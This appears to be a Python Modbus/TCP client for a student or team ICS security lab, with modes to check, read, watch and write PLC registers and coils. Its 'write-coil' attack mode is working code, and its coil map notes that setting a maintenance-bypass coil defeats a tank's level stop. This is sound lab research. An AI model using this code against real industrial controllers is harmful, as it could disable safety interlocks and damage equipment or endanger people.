#!/usr/bin/env python3
"""
ControlShield - PLC lab test client

Modes:
  check       Check TCP/Modbus connectivity
  read        Read one verified holding register
  watch       Monitor one verified holding register
  test-write  Change and restore one approved simulation register
  write-coil  Write one coil (FC5) - Experiment 2 attack driver

Use only on the team's isolated, authorized lab network.
"""

import argparse
import inspect
import json
import time
from datetime import datetime, timezone
from pathlib import Path

from pymodbus.client import ModbusTcpClient

# IMPORTANT:
# Obtain a verified UNUSED holding-register address from your
# teammate's PLC program. This register must NOT control any
# output, timer, counter, safety function, or physical equipment.
#
# Example: If %MW100 is confirmed unused AND mapped to
# Modbus address 100, set this to 100.
#
# Until verified, leave this as None.
SAFE_TEST_REGISTER = None

# Coil map confirmed on the wire (Port_mirroring_test_3 / 06_REFERENCE).
# Modbus coil address -> PLC symbol. Used only to label write-coil events.
COIL_MAP = {
    2: "%M2 Start",
    3: "%M3 Stop",
    4: "%M4 Maintenance bypass (ON defeats the level-80 stop)",
    5: "%M5 Reset",
}


def timestamp():
    return datetime.now(timezone.utc).isoformat()


def record(log_path, action, **details):
    event = {
        "timestamp_utc": timestamp(),
        "actor": "authorized_lab_attacker_simulation",
        "action": action,
        **details,
    }
    print(json.dumps(event))
    with open(log_path, "a", encoding="utf-8") as f:
        f.write(json.dumps(event) + "\n")


def device_args(client, method_name, unit):
    """Support older and newer PyModbus 3.x versions."""
    method = getattr(client, method_name)
    params = inspect.signature(method).parameters

    if "device_id" in params:
        return {"device_id": unit}
    return {"slave": unit}


def read_register(client, address, unit):
    kwargs = device_args(
        client, "read_holding_registers", unit
    )
    response = client.read_holding_registers(
        address=address,
        count=1,
        **kwargs
    )
    if response is None or response.isError():
        raise RuntimeError(f"Register read failed: {response}")

    return response.registers[0]


def write_register(client, address, value, unit):
    kwargs = device_args(client, "write_register", unit)
    response = client.write_register(
        address=address,
        value=value,
        **kwargs
    )
    if response is None or response.isError():
        raise RuntimeError(f"Register write failed: {response}")


def read_coil(client, address, unit):
    kwargs = device_args(client, "read_coils", unit)
    response = client.read_coils(address=address, count=1, **kwargs)
    if response is None or response.isError():
        raise RuntimeError(f"Coil read failed: {response}")
    return int(response.bits[0])


def write_coil(client, address, value, unit):
    kwargs = device_args(client, "write_coil", unit)
    response = client.write_coil(
        address=address,
        value=bool(value),
        **kwargs
    )
    if response is None or response.isError():
        raise RuntimeError(f"Coil write failed: {response}")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("plc_ip")
    parser.add_argument(
        "--mode",
        choices=["check", "read", "watch", "test-write", "write-coil"],
        default="check"
    )
    parser.add_argument("--address", type=int)
    parser.add_argument("--coil", type=int,
                        help="coil address for write-coil mode (e.g. 4 = %%M4)")
    parser.add_argument("--unit", type=int, default=1)
    parser.add_argument("--value", type=int, default=90)
    parser.add_argument("--samples", type=int, default=10)
    parser.add_argument("--interval", type=float, default=2)
    parser.add_argument(
        "--confirm-simulation-only",
        action="store_true"
    )
    parser.add_argument(
        "--log", default="attacker_events.jsonl"
    )
    args = parser.parse_args()

    if args.mode in ("read", "watch"):
        if args.address is None or not 0 <= args.address <= 65535:
            parser.error(
                "Provide a verified Modbus register using --address"
            )

    if args.mode == "watch":
        if not 1 <= args.samples <= 100:
            parser.error("--samples must be 1 through 100")
        if args.interval < 1:
            parser.error("--interval must be at least 1 second")

    if args.mode == "test-write":
        if SAFE_TEST_REGISTER is None:
            parser.error(
                "Set SAFE_TEST_REGISTER only after verifying "
                "an isolated simulation register in the PLC program"
            )
        if not args.confirm_simulation_only:
            parser.error(
                "Explicit --confirm-simulation-only required"
            )
        if not 0 <= args.value <= 100:
            parser.error("Test value must be between 0 and 100")

    if args.mode == "write-coil":
        # Experiment 2 attack driver. This deliberately changes the
        # simulated process (e.g. coil 4 = %M4 maintenance bypass ON,
        # which overflows the simulated tank). Only ever run against the
        # team's own isolated lab PLC, as the project brief specifies.
        if args.coil is None or not 0 <= args.coil <= 65535:
            parser.error("Provide the coil address with --coil (e.g. 4 for %M4)")
        if args.value not in (0, 1):
            parser.error("--value must be 0 or 1 for a coil")
        if not args.confirm_simulation_only:
            parser.error(
                "Explicit --confirm-simulation-only required "
                "(this changes the simulated process on the lab PLC)"
            )

    client = ModbusTcpClient(
        args.plc_ip,
        port=502,
        timeout=3,
        retries=0
    )

    try:
        if not client.connect():
            record(
                args.log, "connection_failed",
                target=args.plc_ip, port=502
            )
            return

        record(
            args.log, "connection_success",
            target=args.plc_ip, port=502,
            mode=args.mode
        )

        if args.mode == "check":
            print("Connection successful. No register modified.")

        elif args.mode == "read":
            value = read_register(
                client, args.address, args.unit
            )
            record(
                args.log, "read",
                address=args.address, value=value
            )

        elif args.mode == "watch":
            for _ in range(args.samples):
                value = read_register(
                    client, args.address, args.unit
                )
                record(
                    args.log, "observation",
                    address=args.address, value=value
                )
                time.sleep(args.interval)

        elif args.mode == "write-coil":
            symbol = COIL_MAP.get(args.coil, f"coil {args.coil}")
            try:
                before = read_coil(client, args.coil, args.unit)
            except Exception:
                before = None  # some coils are not readable; the write still stands
            record(
                args.log, "coil_write_begin",
                coil=args.coil, symbol=symbol,
                value_before=before, requested_value=args.value
            )
            write_coil(client, args.coil, args.value, args.unit)
            try:
                after = read_coil(client, args.coil, args.unit)
            except Exception:
                after = None
            record(
                args.log, "coil_write_result",
                coil=args.coil, symbol=symbol,
                observed_value=after,
                matched=(after == args.value if after is not None else None)
            )
            print(
                f"Wrote coil {args.coil} ({symbol}) = {args.value}. "
                f"Run again with --value {1 - args.value} to set it back."
            )

        elif args.mode == "test-write":
            address = SAFE_TEST_REGISTER
            original = read_register(
                client, address, args.unit
            )
            record(
                args.log, "test_begin",
                address=address,
                original_value=original,
                requested_value=args.value
            )

            try:
                write_register(
                    client, address, args.value, args.unit
                )
                observed = read_register(
                    client, address, args.unit
                )
                record(
                    args.log, "test_write_result",
                    address=address,
                    observed_value=observed,
                    matched=(observed == args.value)
                )
                time.sleep(3)

            finally:
                # Best-effort restoration after the test.
                # Network errors can prevent successful restoration.
                try:
                    write_register(
                        client, address, original, args.unit
                    )
                    restored = read_register(
                        client, address, args.unit
                    )
                    record(
                        args.log, "restore_result",
                        address=address,
                        expected=original,
                        observed=restored,
                        restored=(restored == original)
                    )
                except Exception as exc:
                    record(
                        args.log, "RESTORATION_FAILED",
                        address=address,
                        error=str(exc)
                    )
                    print(
                        "WARNING: Verify and restore the test "
                        "register manually in Machine Expert Basic."
                    )

    except Exception as exc:
        record(
            args.log, "error",
            error_type=type(exc).__name__,
            message=str(exc)
        )
        raise

    finally:
        client.close()


if __name__ == "__main__":
    main()
